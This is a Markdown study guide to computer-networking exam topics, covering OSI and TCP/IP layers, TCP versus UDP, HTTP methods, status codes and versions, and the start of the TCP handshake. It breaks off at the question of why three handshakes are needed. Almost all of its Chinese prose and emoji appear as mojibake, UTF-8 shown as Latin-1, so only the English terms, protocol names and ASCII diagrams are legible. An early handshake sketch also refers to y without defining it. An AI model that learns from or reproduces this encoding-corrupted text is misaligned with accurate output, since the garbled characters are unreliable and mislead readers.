# ğŸ¯ è®¡ç®—æœºç½‘ç»œé«˜é¢‘è€ƒç‚¹

> ç³»ç»Ÿæ•´ç†è®¡ç®—æœºç½‘ç»œçš„æ ¸å¿ƒè€ƒç‚¹ï¼Œå¸®åŠ©ä½ é«˜æ•ˆæŒæ¡ç½‘ç»œåŸç†ï¼

## ğŸ“š æ–‡æ¡£ç»“æ„

æœ¬æ–‡æ¡£æŒ‰ç…§**ç”±åŸºç¡€åˆ°åº”ç”¨ã€ç”±æ¦‚å¿µåˆ°å®è·µ**çš„é¡ºåºæ•´ç†è€ƒç‚¹ï¼Œæ¯ä¸ªè€ƒç‚¹åŒ…å«ï¼š
- ğŸ¯ **æ ¸å¿ƒæ¦‚å¿µ**ï¼šæœ€é‡è¦çš„çŸ¥è¯†ç‚¹
- ğŸ“– **è¯¦ç»†è§£æ**ï¼šæ·±å…¥ç†è§£åŸç†
- ğŸ’¡ **è®°å¿†æŠ€å·§**ï¼šå¿«é€Ÿè®°å¿†æ–¹æ³•
- â“ **å…¸å‹è€ƒé¢˜**ï¼šå¸¸è§é¢˜ç›®ç±»å‹
- âš ï¸ **æ˜“é”™ç‚¹**ï¼šéœ€è¦ç‰¹åˆ«æ³¨æ„çš„åœ°æ–¹

---

## 1ï¸âƒ£ OSIä¸ƒå±‚æ¨¡å‹ä¸TCP/IPå››å±‚æ¨¡å‹

### ğŸ¯ æ ¸å¿ƒæ¦‚å¿µ

**OSIä¸ƒå±‚æ¨¡å‹**æ˜¯ç½‘ç»œåè®®è®¾è®¡çš„ç†è®ºåŸºç¡€ï¼Œ**TCP/IPå››å±‚æ¨¡å‹**æ˜¯äº’è”ç½‘çš„å®é™…å®ç°ã€‚

### ğŸ“– è¯¦ç»†è§£æ

#### OSIä¸ƒå±‚æ¨¡å‹ï¼ˆä»ä¸Šåˆ°ä¸‹ï¼‰
```
åº”ç”¨å±‚ (Application)    â† ç”¨æˆ·æ¥å£ï¼Œæä¾›ç½‘ç»œæœåŠ¡
è¡¨ç¤ºå±‚ (Presentation)   â† æ•°æ®æ ¼å¼è½¬æ¢ã€åŠ å¯†è§£å¯†
ä¼šè¯å±‚ (Session)        â† å»ºç«‹ã€ç®¡ç†ã€ç»ˆæ­¢ä¼šè¯
ä¼ è¾“å±‚ (Transport)      â† ç«¯åˆ°ç«¯å¯é ä¼ è¾“
ç½‘ç»œå±‚ (Network)        â† è·¯å¾„é€‰æ‹©å’Œé€»è¾‘å¯»å€
æ•°æ®é“¾è·¯å±‚ (Data Link)   â† ç‰©ç†å¯»å€ï¼Œé”™è¯¯æ£€æµ‹
ç‰©ç†å±‚ (Physical)       â† æ¯”ç‰¹æµä¼ è¾“
```

#### TCP/IPå››å±‚æ¨¡å‹
```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚   TCP/IPå››å±‚     â”‚      åŠŸèƒ½         â”‚    ä¸»è¦åè®®          â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚   åº”ç”¨å±‚         â”‚ ç”¨æˆ·æ¥å£å’ŒæœåŠ¡    â”‚ HTTPã€HTTPSã€FTPã€   â”‚
â”‚                 â”‚                  â”‚ DNSã€SMTPã€SSH      â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚   ä¼ è¾“å±‚         â”‚ ç«¯åˆ°ç«¯ä¼ è¾“       â”‚ TCPã€UDP            â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚   ç½‘ç»œå±‚         â”‚ è·¯ç”±å’Œå¯»å€       â”‚ IPã€ICMPã€ARP       â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚   é“¾è·¯å±‚         â”‚ ç‰©ç†ç½‘ç»œæ¥å£     â”‚ ä»¥å¤ªç½‘ã€WiFi        â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

#### æ•°æ®å°è£…è¿‡ç¨‹
```
ç”¨æˆ·æ•°æ®
    â†“
[åº”ç”¨å±‚] æ·»åŠ åº”ç”¨å¤´ â†’ HTTPå¤´ + æ•°æ®
    â†“
[ä¼ è¾“å±‚] æ·»åŠ TCPå¤´  â†’ TCPå¤´ + HTTPå¤´ + æ•°æ®
    â†“
[ç½‘ç»œå±‚] æ·»åŠ IPå¤´   â†’ IPå¤´ + TCPå¤´ + HTTPå¤´ + æ•°æ®
    â†“
[é“¾è·¯å±‚] æ·»åŠ å¸§å¤´   â†’ ä»¥å¤ªç½‘å¤´ + IPå¤´ + TCPå¤´ + HTTPå¤´ + æ•°æ® + æ ¡éªŒ
```

### ğŸ’¡ è®°å¿†æŠ€å·§

**OSIä¸ƒå±‚è®°å¿†å£è¯€**ï¼š
- **è‹±æ–‡**ï¼šAll People Seem To Need Data Processing
- **ä¸­æ–‡**ï¼šåº”è¡¨ä¼šä¼ ç½‘é“¾ç‰©ï¼ˆ"åº”è¯¥å˜æˆä¼ ç½‘è”ç‰©"ï¼‰

**å„å±‚ä¸»è¦åŠŸèƒ½è®°å¿†**ï¼š
- **åº”ç”¨å±‚**ï¼šç”¨æˆ·çœ‹å¾—è§çš„ï¼ˆæµè§ˆå™¨ã€é‚®ä»¶å®¢æˆ·ç«¯ï¼‰
- **ä¼ è¾“å±‚**ï¼šå¯é æ€§ä¿è¯ï¼ˆTCPä¸‰æ¬¡æ¡æ‰‹ï¼‰
- **ç½‘ç»œå±‚**ï¼šæ‰¾è·¯å¾„ï¼ˆè·¯ç”±å™¨å·¥ä½œå±‚ï¼‰
- **é“¾è·¯å±‚**ï¼šæœ¬åœ°ä¼ è¾“ï¼ˆäº¤æ¢æœºå·¥ä½œå±‚ï¼‰

### â“ å…¸å‹è€ƒé¢˜

1. **é€‰æ‹©é¢˜**ï¼šä»¥ä¸‹å“ªä¸ªåè®®å·¥ä½œåœ¨ä¼ è¾“å±‚ï¼Ÿ
   - A. HTTP  B. TCP  C. IP  D. ARP
   - **ç­”æ¡ˆ**ï¼šBï¼ˆTCPå·¥ä½œåœ¨ä¼ è¾“å±‚ï¼‰

2. **ç®€ç­”é¢˜**ï¼šæè¿°æ•°æ®ä»åº”ç”¨å±‚åˆ°ç‰©ç†å±‚çš„å°è£…è¿‡ç¨‹
   - **è¦ç‚¹**ï¼šé€å±‚æ·»åŠ åè®®å¤´ï¼Œå½¢æˆåè®®æ•°æ®å•å…ƒ

3. **åˆ†æé¢˜**ï¼šä¸ºä»€ä¹ˆè¦é‡‡ç”¨åˆ†å±‚æ¶æ„è®¾è®¡ç½‘ç»œåè®®ï¼Ÿ
   - **è¦ç‚¹**ï¼šæ¨¡å—åŒ–ã€ç‹¬ç«‹æ€§ã€å¯ç»´æŠ¤æ€§ã€äº’æ“ä½œæ€§

### âš ï¸ æ˜“é”™ç‚¹

- **æ˜“æ··æ·†**ï¼šOSIä¸ƒå±‚æ˜¯ç†è®ºæ¨¡å‹ï¼ŒTCP/IPå››å±‚æ˜¯å®é™…åº”ç”¨
- **å±‚æ¬¡å¯¹åº”**ï¼šOSIçš„åº”ç”¨å±‚ã€è¡¨ç¤ºå±‚ã€ä¼šè¯å±‚å¯¹åº”TCP/IPçš„åº”ç”¨å±‚
- **è®¾å¤‡å¯¹åº”**ï¼šè·¯ç”±å™¨å·¥ä½œåœ¨ç½‘ç»œå±‚ï¼Œäº¤æ¢æœºå·¥ä½œåœ¨æ•°æ®é“¾è·¯å±‚

---

## 2ï¸âƒ£ TCP/UDPåè®®å¯¹æ¯”

### ğŸ¯ æ ¸å¿ƒæ¦‚å¿µ

**TCP**ï¼ˆä¼ è¾“æ§åˆ¶åè®®ï¼‰æ˜¯**é¢å‘è¿æ¥çš„å¯é ä¼ è¾“åè®®**ï¼Œ**UDP**ï¼ˆç”¨æˆ·æ•°æ®æŠ¥åè®®ï¼‰æ˜¯**æ— è¿æ¥çš„ä¸å¯é ä¼ è¾“åè®®**ã€‚

### ğŸ“– è¯¦ç»†è§£æ

#### TCP vs UDP å¯¹æ¯”è¡¨
```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚   ç‰¹æ€§        â”‚      TCP        â”‚      UDP        â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ è¿æ¥æ€§       â”‚ é¢å‘è¿æ¥         â”‚ æ— è¿æ¥           â”‚
â”‚ å¯é æ€§       â”‚ å¯é ä¼ è¾“         â”‚ ä¸å¯é ä¼ è¾“       â”‚
â”‚ æµé‡æ§åˆ¶     â”‚ æœ‰               â”‚ æ—                â”‚
â”‚ æ‹¥å¡æ§åˆ¶     â”‚ æœ‰               â”‚ æ—                â”‚
â”‚ å¤´éƒ¨å¼€é”€     â”‚ 20å­—èŠ‚           â”‚ 8å­—èŠ‚            â”‚
â”‚ ä¼ è¾“æ•ˆç‡     â”‚ è¾ƒä½             â”‚ è¾ƒé«˜             â”‚
â”‚ åº”ç”¨åœºæ™¯     â”‚ æ–‡ä»¶ä¼ è¾“ã€ç½‘é¡µ   â”‚ éŸ³è§†é¢‘ã€DNS      â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

#### TCPåè®®ç‰¹ç‚¹è¯¦è§£

**1. é¢å‘è¿æ¥**
```
å®¢æˆ·ç«¯                    æœåŠ¡å™¨
  |                        |
  |---- SYNåºå·=x -------->|  (è¯·æ±‚è¿æ¥)
  |<--- SYN+ACKç¡®è®¤=x+1 ---|  (åŒæ„è¿æ¥)
  |---- ACKç¡®è®¤=y+1 ------>|  (ç¡®è®¤è¿æ¥)
  |                        |
 è¿æ¥å»ºç«‹å®Œæˆ
```

**2. å¯é ä¼ è¾“æœºåˆ¶**
- **åºå·æœºåˆ¶**ï¼šæ¯ä¸ªå­—èŠ‚éƒ½æœ‰åºå·ï¼Œç¡®ä¿é¡ºåº
- **ç¡®è®¤æœºåˆ¶**ï¼šæ¥æ”¶æ–¹ç¡®è®¤æ”¶åˆ°æ•°æ®
- **é‡ä¼ æœºåˆ¶**ï¼šä¸¢å¤±æ•°æ®è‡ªåŠ¨é‡ä¼ 
- **æ ¡éªŒå’Œ**ï¼šæ£€æµ‹æ•°æ®æ˜¯å¦æŸå

**3. æµé‡æ§åˆ¶**
```
å‘é€æ–¹ -----> [æ»‘åŠ¨çª—å£] -----> æ¥æ”¶æ–¹
       çª—å£å¤§å°æ ¹æ®æ¥æ”¶æ–¹ç¼“å†²åŒºè°ƒæ•´
```

**4. æ‹¥å¡æ§åˆ¶**
- **æ…¢å¯åŠ¨**ï¼šä»å°çª—å£å¼€å§‹ï¼Œé€æ¸å¢å¤§
- **æ‹¥å¡é¿å…**ï¼šçº¿æ€§å¢é•¿ï¼Œé¿å…ç½‘ç»œæ‹¥å¡
- **å¿«é‡ä¼ **ï¼šæ”¶åˆ°3ä¸ªé‡å¤ACKç«‹å³é‡ä¼ 
- **å¿«æ¢å¤**ï¼šå‡åŠçª—å£å¤§å°ï¼Œå¿«é€Ÿæ¢å¤

#### UDPåè®®ç‰¹ç‚¹è¯¦è§£

**1. æ— è¿æ¥ç‰¹æ€§**
- ä¸éœ€è¦å»ºç«‹è¿æ¥ï¼Œç›´æ¥å‘é€æ•°æ®
- å‘é€æ–¹ä¸çŸ¥é“æ¥æ”¶æ–¹æ˜¯å¦å‡†å¤‡å¥½
- é€‚åˆå¹¿æ’­å’Œç»„æ’­åº”ç”¨

**2. ä¸å¯é ä¼ è¾“**
- ä¸ä¿è¯æ•°æ®åˆ°è¾¾
- ä¸ä¿è¯æ•°æ®é¡ºåº
- ä¸æä¾›é”™è¯¯æ¢å¤

**3. é«˜æ•ˆä¼ è¾“**
- å¤´éƒ¨å¼€é”€å°ï¼ˆä»…8å­—èŠ‚ï¼‰
- æ— è¿æ¥å»ºç«‹æ—¶é—´
- æ— æµé‡æ§åˆ¶å»¶è¿Ÿ

### ğŸ’¡ è®°å¿†æŠ€å·§

**TCPç‰¹ç‚¹è®°å¿†**ï¼š**"å¯é çš„è¿æ¥ä¼ è¾“"**
- **T**ï¼šThree-way handshakeï¼ˆä¸‰æ¬¡æ¡æ‰‹ï¼‰
- **C**ï¼šConnection-orientedï¼ˆé¢å‘è¿æ¥ï¼‰
- **P**ï¼šPacket orderï¼ˆåŒ…é¡ºåºä¿è¯ï¼‰

**UDPç‰¹ç‚¹è®°å¿†**ï¼š**"å¿«é€Ÿçš„æ•°æ®æŠ¥"**
- **U**ï¼šUnreliableï¼ˆä¸å¯é ï¼‰
- **D**ï¼šDatagramï¼ˆæ•°æ®æŠ¥ï¼‰
- **P**ï¼šPerformanceï¼ˆé«˜æ€§èƒ½ï¼‰

**åº”ç”¨åœºæ™¯è®°å¿†**ï¼š
- **TCP**ï¼šè¦æ±‚"å®Œæ•´æ€§"çš„åº”ç”¨ï¼ˆæ–‡ä»¶ã€ç½‘é¡µã€é‚®ä»¶ï¼‰
- **UDP**ï¼šè¦æ±‚"å®æ—¶æ€§"çš„åº”ç”¨ï¼ˆéŸ³è§†é¢‘ã€æ¸¸æˆã€DNSï¼‰

### â“ å…¸å‹è€ƒé¢˜

1. **é€‰æ‹©é¢˜**ï¼šTCPåè®®çš„ä¸»è¦ç‰¹ç‚¹æ˜¯ï¼Ÿ
   - A. æ— è¿æ¥  B. ä¸å¯é   C. é¢å‘è¿æ¥  D. é«˜æ•ˆç‡
   - **ç­”æ¡ˆ**ï¼šC

2. **ç®€ç­”é¢˜**ï¼šè§£é‡ŠTCPçš„å¯é ä¼ è¾“æœºåˆ¶
   - **è¦ç‚¹**ï¼šåºå·ã€ç¡®è®¤ã€é‡ä¼ ã€æ ¡éªŒå’Œ

3. **åº”ç”¨é¢˜**ï¼šåœ¨çº¿æ¸¸æˆåº”è¯¥é€‰æ‹©TCPè¿˜æ˜¯UDPï¼Ÿä¸ºä»€ä¹ˆï¼Ÿ
   - **ç­”æ¡ˆ**ï¼šUDPï¼Œå› ä¸ºæ¸¸æˆéœ€è¦å®æ—¶æ€§ï¼Œå…è®¸å°‘é‡æ•°æ®ä¸¢å¤±

### âš ï¸ æ˜“é”™ç‚¹

- **å¯é æ€§è¯¯è§£**ï¼šTCPå¯é æ˜¯æŒ‡æœ€ç»ˆèƒ½æ”¶åˆ°ï¼Œä¸æ˜¯ç«‹å³æ”¶åˆ°
- **æ•ˆç‡å¯¹æ¯”**ï¼šUDPå¿«æ˜¯å› ä¸ºå¼€é”€å°ï¼Œä¸æ˜¯å› ä¸ºä¼ è¾“é€Ÿåº¦å¿«
- **åº”ç”¨é€‰æ‹©**ï¼šä¸èƒ½ç®€å•è¯´TCPå¥½æˆ–UDPå¥½ï¼Œè¦çœ‹åº”ç”¨éœ€æ±‚

---

## 3ï¸âƒ£ HTTPåè®®è¯¦è§£

### ğŸ¯ æ ¸å¿ƒæ¦‚å¿µ

**HTTP**ï¼ˆè¶…æ–‡æœ¬ä¼ è¾“åè®®ï¼‰æ˜¯Webåº”ç”¨çš„åŸºç¡€åè®®ï¼ŒåŸºäº**è¯·æ±‚-å“åº”æ¨¡å¼**ï¼Œå·¥ä½œåœ¨**åº”ç”¨å±‚**ã€‚

### ğŸ“– è¯¦ç»†è§£æ

#### HTTPè¯·æ±‚æ–¹æ³•

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  æ–¹æ³•    â”‚      ä½œç”¨        â”‚     ç‰¹ç‚¹           â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ GET     â”‚ è·å–èµ„æº         â”‚ å®‰å…¨ã€å¹‚ç­‰ã€å¯ç¼“å­˜ â”‚
â”‚ POST    â”‚ æäº¤æ•°æ®         â”‚ ä¸å®‰å…¨ã€ä¸å¹‚ç­‰     â”‚
â”‚ PUT     â”‚ æ›´æ–°èµ„æº         â”‚ å¹‚ç­‰ã€ä¸å®‰å…¨       â”‚
â”‚ DELETE  â”‚ åˆ é™¤èµ„æº         â”‚ å¹‚ç­‰ã€ä¸å®‰å…¨       â”‚
â”‚ PATCH   â”‚ éƒ¨åˆ†æ›´æ–°         â”‚ ä¸å¹‚ç­‰ã€ä¸å®‰å…¨     â”‚
â”‚ HEAD    â”‚ è·å–å¤´ä¿¡æ¯       â”‚ å®‰å…¨ã€å¹‚ç­‰         â”‚
â”‚ OPTIONS â”‚ è·å–æ”¯æŒçš„æ–¹æ³•   â”‚ å®‰å…¨ã€å¹‚ç­‰         â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

#### HTTPçŠ¶æ€ç åˆ†ç±»

**1xx ä¿¡æ¯æ€§çŠ¶æ€ç **
- `100 Continue`ï¼šç»§ç»­è¯·æ±‚
- `101 Switching Protocols`ï¼šåè®®åˆ‡æ¢

**2xx æˆåŠŸçŠ¶æ€ç **
- `200 OK`ï¼šè¯·æ±‚æˆåŠŸ
- `201 Created`ï¼šèµ„æºåˆ›å»ºæˆåŠŸ
- `204 No Content`ï¼šæˆåŠŸä½†æ— è¿”å›å†…å®¹

**3xx é‡å®šå‘çŠ¶æ€ç **
- `301 Moved Permanently`ï¼šæ°¸ä¹…é‡å®šå‘
- `302 Found`ï¼šä¸´æ—¶é‡å®šå‘
- `304 Not Modified`ï¼šèµ„æºæœªä¿®æ”¹

**4xx å®¢æˆ·ç«¯é”™è¯¯**
- `400 Bad Request`ï¼šè¯·æ±‚è¯­æ³•é”™è¯¯
- `401 Unauthorized`ï¼šæœªæˆæƒ
- `403 Forbidden`ï¼šç¦æ­¢è®¿é—®
- `404 Not Found`ï¼šèµ„æºä¸å­˜åœ¨
- `429 Too Many Requests`ï¼šè¯·æ±‚è¿‡å¤š

**5xx æœåŠ¡å™¨é”™è¯¯**
- `500 Internal Server Error`ï¼šæœåŠ¡å™¨å†…éƒ¨é”™è¯¯
- `502 Bad Gateway`ï¼šç½‘å…³é”™è¯¯
- `503 Service Unavailable`ï¼šæœåŠ¡ä¸å¯ç”¨

#### HTTPç‰ˆæœ¬æ¼”è¿›

**HTTP/1.0 (1996)**
- æ¯ä¸ªè¯·æ±‚éƒ½éœ€è¦å»ºç«‹æ–°çš„TCPè¿æ¥
- ä¸æ”¯æŒæŒä¹…è¿æ¥
- ç®€å•ä½†æ•ˆç‡ä½

**HTTP/1.1 (1997)**
```
æ–°å¢ç‰¹æ€§ï¼š
âœ… æŒä¹…è¿æ¥ï¼ˆConnection: keep-aliveï¼‰
âœ… ç®¡é“åŒ–ï¼ˆPipeliningï¼‰
âœ… å—ä¼ è¾“ç¼–ç ï¼ˆChunked Transfer Encodingï¼‰
âœ… ç¼“å­˜æ§åˆ¶ï¼ˆCache-Controlï¼‰
âœ… Hostå¤´å­—æ®µï¼ˆè™šæ‹Ÿä¸»æœºæ”¯æŒï¼‰
```

**HTTP/2 (2015)**
```
æ ¸å¿ƒæ”¹è¿›ï¼š
ğŸš€ äºŒè¿›åˆ¶åˆ†å¸§ï¼šæ›¿ä»£æ–‡æœ¬åè®®
ğŸš€ å¤šè·¯å¤ç”¨ï¼šä¸€ä¸ªè¿æ¥å¹¶å‘å¤šä¸ªè¯·æ±‚
ğŸš€ å¤´éƒ¨å‹ç¼©ï¼šHPACKç®—æ³•å‡å°‘å¤´éƒ¨å¤§å°
ğŸš€ æœåŠ¡å™¨æ¨é€ï¼šä¸»åŠ¨æ¨é€èµ„æºç»™å®¢æˆ·ç«¯
ğŸš€ æµä¼˜å…ˆçº§ï¼šæ§åˆ¶èµ„æºåŠ è½½é¡ºåº
```

**HTTP/3 (2020)**
```
é©å‘½æ€§å˜åŒ–ï¼š
âš¡ åŸºäºQUICåè®®ï¼ˆUDPåŸºç¡€ï¼‰
âš¡ 0-RTTè¿æ¥å»ºç«‹
âš¡ è¿æ¥è¿ç§»æ”¯æŒ
âš¡ æ›´å¥½çš„ä¸¢åŒ…æ¢å¤
âš¡ å½»åº•è§£å†³é˜Ÿå¤´é˜»å¡
```

#### HTTPè¯·æ±‚/å“åº”ç»“æ„

**HTTPè¯·æ±‚æ ¼å¼**
```
POST /api/users HTTP/1.1          â† è¯·æ±‚è¡Œ
Host: api.example.com             â† è¯·æ±‚å¤´
Content-Type: application/json    â† è¯·æ±‚å¤´
Content-Length: 45                â† è¯·æ±‚å¤´
Authorization: Bearer token123    â† è¯·æ±‚å¤´
                                  â† ç©ºè¡Œ
{"name": "å¼ ä¸‰", "age": 25}        â† è¯·æ±‚ä½“
```

**HTTPå“åº”æ ¼å¼**
```
HTTP/1.1 200 OK                   â† çŠ¶æ€è¡Œ
Content-Type: application/json    â† å“åº”å¤´
Content-Length: 67                â† å“åº”å¤´
Set-Cookie: session=abc123        â† å“åº”å¤´
Cache-Control: max-age=3600       â† å“åº”å¤´
                                  â† ç©ºè¡Œ
{"id": 1, "name": "å¼ ä¸‰", "age": 25} â† å“åº”ä½“
```

### ğŸ’¡ è®°å¿†æŠ€å·§

**HTTPæ–¹æ³•è®°å¿†**ï¼š**"å¢åˆ æ”¹æŸ¥+é€‰é¡¹"**
- **C**reate â†’ POST
- **R**ead â†’ GET
- **U**pdate â†’ PUT/PATCH
- **D**elete â†’ DELETE
- **O**ptions â†’ OPTIONS/HEAD

**çŠ¶æ€ç è®°å¿†**ï¼š
- **2xx**ï¼š**"æˆåŠŸ"** â†’ 200 OK
- **3xx**ï¼š**"é‡å®šå‘"** â†’ 301æ°¸ä¹…ï¼Œ302ä¸´æ—¶
- **4xx**ï¼š**"å®¢æˆ·ç«¯é”™è¯¯"** â†’ 404æ‰¾ä¸åˆ°ï¼Œ401æœªæˆæƒ
- **5xx**ï¼š**"æœåŠ¡å™¨é”™è¯¯"** â†’ 500å†…éƒ¨é”™è¯¯

**HTTPç‰ˆæœ¬ç‰¹ç‚¹**ï¼š
- **1.0**ï¼š**"ä¸€æ¬¡æ€§"** â†’ ä¸€ä¸ªè¿æ¥ä¸€ä¸ªè¯·æ±‚
- **1.1**ï¼š**"æŒä¹…åŒ–"** â†’ é•¿è¿æ¥å¤ç”¨
- **2.0**ï¼š**"å¤šè·¯å¤ç”¨"** â†’ äºŒè¿›åˆ¶åˆ†å¸§
- **3.0**ï¼š**"åŸºäºUDP"** â†’ QUICåè®®

### â“ å…¸å‹è€ƒé¢˜

1. **é€‰æ‹©é¢˜**ï¼šHTTPçŠ¶æ€ç 404è¡¨ç¤ºä»€ä¹ˆï¼Ÿ
   - A. æœåŠ¡å™¨é”™è¯¯  B. èµ„æºä¸å­˜åœ¨  C. æœªæˆæƒ  D. é‡å®šå‘
   - **ç­”æ¡ˆ**ï¼šB

2. **ç®€ç­”é¢˜**ï¼šHTTP/1.1ç›¸æ¯”HTTP/1.0æœ‰å“ªäº›æ”¹è¿›ï¼Ÿ
   - **è¦ç‚¹**ï¼šæŒä¹…è¿æ¥ã€ç®¡é“åŒ–ã€ç¼“å­˜æ§åˆ¶ã€Hostå¤´

3. **åˆ†æé¢˜**ï¼šä¸ºä»€ä¹ˆHTTP/2èƒ½æé«˜ç½‘é¡µåŠ è½½é€Ÿåº¦ï¼Ÿ
   - **è¦ç‚¹**ï¼šå¤šè·¯å¤ç”¨ã€å¤´éƒ¨å‹ç¼©ã€æœåŠ¡å™¨æ¨é€

### âš ï¸ æ˜“é”™ç‚¹

- **GET vs POST**ï¼šGETä¸æ˜¯ä¸èƒ½ä¼ æ•°æ®ï¼Œè€Œæ˜¯æ•°æ®åœ¨URLä¸­
- **çŠ¶æ€ç **ï¼š301å’Œ302éƒ½æ˜¯é‡å®šå‘ï¼ŒåŒºåˆ«åœ¨äºæ°¸ä¹…æ€§
- **HTTP/2**ï¼šä¸æ˜¯æ‰€æœ‰ç½‘ç«™éƒ½æ”¯æŒï¼Œéœ€è¦HTTPS
- **å¹‚ç­‰æ€§**ï¼šGETã€PUTã€DELETEæ˜¯å¹‚ç­‰çš„ï¼ŒPOSTä¸æ˜¯

---

## 4ï¸âƒ£ ä¸‰æ¬¡æ¡æ‰‹ä¸å››æ¬¡æŒ¥æ‰‹

### ğŸ¯ æ ¸å¿ƒæ¦‚å¿µ

**ä¸‰æ¬¡æ¡æ‰‹**ç”¨äºå»ºç«‹TCPè¿æ¥ï¼Œ**å››æ¬¡æŒ¥æ‰‹**ç”¨äºæ–­å¼€TCPè¿æ¥ï¼Œç¡®ä¿æ•°æ®ä¼ è¾“çš„å¯é æ€§ã€‚

### ğŸ“– è¯¦ç»†è§£æ

#### ä¸‰æ¬¡æ¡æ‰‹è¿‡ç¨‹

```
å®¢æˆ·ç«¯                                æœåŠ¡å™¨
  |                                    |
  |           ç¬¬ä¸€æ¬¡æ¡æ‰‹                |
  |---- SYN=1, seq=x ----------------->| (å®¢æˆ·ç«¯è¯·æ±‚è¿æ¥)
  |                                    |
  |           ç¬¬äºŒæ¬¡æ¡æ‰‹                |
  |<--- SYN=1, ACK=1, seq=y, ack=x+1 --| (æœåŠ¡å™¨åŒæ„è¿æ¥)
  |                                    |
  |           ç¬¬ä¸‰æ¬¡æ¡æ‰‹                |
  |---- ACK=1, seq=x+1, ack=y+1 ------>| (å®¢æˆ·ç«¯ç¡®è®¤è¿æ¥)
  |                                    |
            TCPè¿æ¥å»ºç«‹å®Œæˆ
```

**è¯¦ç»†æ­¥éª¤è§£æ**ï¼š

**ç¬¬ä¸€æ¬¡æ¡æ‰‹**ï¼š
- å®¢æˆ·ç«¯å‘é€SYN=1ï¼Œseq=x
- å®¢æˆ·ç«¯è¿›å…¥SYN_SENTçŠ¶æ€
- å«ä¹‰ï¼š**"æˆ‘æƒ³å’Œä½ å»ºç«‹è¿æ¥"**

**ç¬¬äºŒæ¬¡æ¡æ‰‹**ï¼š
- æœåŠ¡å™¨å›å¤SYN=1ï¼ŒACK=1ï¼Œseq=yï¼Œack=x+1
- æœåŠ¡å™¨è¿›å…¥SYN_RCVDçŠ¶æ€
- å«ä¹‰ï¼š**"æˆ‘æ”¶åˆ°äº†ä½ çš„è¯·æ±‚ï¼Œæˆ‘ä¹Ÿæƒ³å’Œä½ å»ºç«‹è¿æ¥"**

**ç¬¬ä¸‰æ¬¡æ¡æ‰‹**ï¼š
- å®¢æˆ·ç«¯å‘é€ACK=1ï¼Œseq=x+1ï¼Œack=y+1
- åŒæ–¹è¿›å…¥ESTABLISHEDçŠ¶æ€
- å«ä¹‰ï¼š**"æˆ‘æ”¶åˆ°äº†ä½ çš„å›å¤ï¼Œè¿æ¥å»ºç«‹"**

#### ä¸ºä»€ä¹ˆæ˜¯ä¸‰æ¬¡æ¡æ‰‹ï¼Ÿ

